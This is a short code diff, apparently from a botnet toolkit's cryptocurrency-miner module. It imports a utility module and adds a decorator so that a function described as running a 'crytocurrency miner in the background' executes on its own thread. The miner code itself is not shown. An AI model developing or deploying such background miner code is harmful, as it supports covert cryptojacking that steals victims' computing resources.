@@ -23,6 +23,9 @@ try:
 except NameError:
     xrange = range	# Python 3
 
+# byob utilities
+import util
+
 # globals
 command = True
 results = {}
@@ -863,7 +866,7 @@ def test_subscription():
   log('TEST: Correct answer %r' % valid, LEVEL_DEBUG)
 
 
-
+@util.threaded
 def run(url, username, password):
 	"""
 	Run the crytocurrency miner in the background
